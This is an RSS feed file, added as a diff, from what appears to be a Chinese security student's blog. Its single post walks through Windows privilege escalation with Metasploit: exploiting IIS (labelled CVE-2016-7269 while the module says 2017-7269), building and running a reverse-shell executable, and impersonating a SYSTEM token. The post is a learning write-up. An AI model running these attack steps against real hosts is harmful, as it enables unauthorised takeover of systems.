@@ -1,0 +1,53 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Go Forward • Posts by &#34;windows内核提权&#34; tag</title>
+        <link>http://chungod.github.io</link>
+        <description>欢迎来到我的博客(*^﹏^*),本人为新人,你可以阅读我的学习笔记并提出独到的见解~我们将互相学习,共同进步,望大佬们勿喷</description>
+        <language>zh-CN</language>
+        <pubDate>Fri, 16 Apr 2021 00:00:00 +0800</pubDate>
+        <lastBuildDate>Fri, 16 Apr 2021 00:00:00 +0800</lastBuildDate>
+        <category>php危险函数</category>
+        <category>paramiko模块介绍</category>
+        <category>内存取证</category>
+        <category>Windows内核提权</category>
+        <category>Linux提权</category>
+        <category>meterpreter学习笔记</category>
+        <category>溯源取证总结</category>
+        <category>upload-labs通关记录</category>
+        <item>
+            <guid isPermalink="true">http://chungod.github.io/2021/04/16/tiquan/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</guid>
+            <title>Windows内核提权</title>
+            <link>http://chungod.github.io/2021/04/16/tiquan/Windows%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</link>
+            <category>Windows内核提权</category>
+            <pubDate>Fri, 16 Apr 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;windows内核提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#windows内核提权&#34;&gt;#&lt;/a&gt; Windows 内核提权&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Cve-2016-7269 低权限提权&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;第一种方法&lt;/p&gt;
+&lt;p&gt;利用模块进行渗透&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit&amp;#x2F;windows&amp;#x2F;iis&amp;#x2F;cve-2017-7269&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;exploit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163403824.png&#34; alt=&#34;image-20210320163403824&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是 windows 低权限，限免进行提权&lt;/p&gt;
+&lt;h3 id=&#34;生成exe上传反弹木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#生成exe上传反弹木马&#34;&gt;#&lt;/a&gt; 生成 exe 上传反弹木马&lt;/h3&gt;
+&lt;p&gt;生成反弹木马&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;msfpc windows 本地IP 3333&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mv windows-*.exe 1.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfconsole -r windows-*exe.rc&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163757983.png&#34; alt=&#34;image-20210320172549963&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163555815.png&#34; alt=&#34;image-20210320163555815&#34;&gt;&lt;/p&gt;
+&lt;p&gt;上传 1.exe 到 C:/1 / 下，进行反弹&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;execute -f 1.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163856952.png&#34; alt=&#34;image-20210320163856952&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320163912440.png&#34; alt=&#34;image-20210320163757983&#34;&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;利用run post&amp;#x2F;multi&amp;#x2F;recon&amp;#x2F;local_exploit_suggester 查看可利用模块&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320164413649.png&#34; alt=&#34;image-20210320165533159&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320165555084.png&#34; alt=&#34;image-20210320164413649&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获得 windows 高权限&lt;/p&gt;
+&lt;h2 id=&#34;扩展方法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩展方法&#34;&gt;#&lt;/a&gt; 扩展方法&lt;/h2&gt;
+&lt;h3 id=&#34;令牌提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#令牌提权&#34;&gt;#&lt;/a&gt; 令牌提权&lt;/h3&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320171633846.png&#34; alt=&#34;image-20210320171633846&#34;&gt;&lt;/p&gt;
+&lt;p&gt;低权限令牌提权&lt;/p&gt;
+&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use incognito # 加载窃取令牌模块&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_tokens -u # 查看可用的用户令牌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_tokens -g # 查看可用的用户组令牌&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;impersonate_token &amp;#39;NT AUTHORITY\SYSTEM&amp;#39; # 假冒 SYSTEM token&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rev2self #返回原始 token&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210320172549963.png&#34; alt=&#34;image-20210320165555084&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
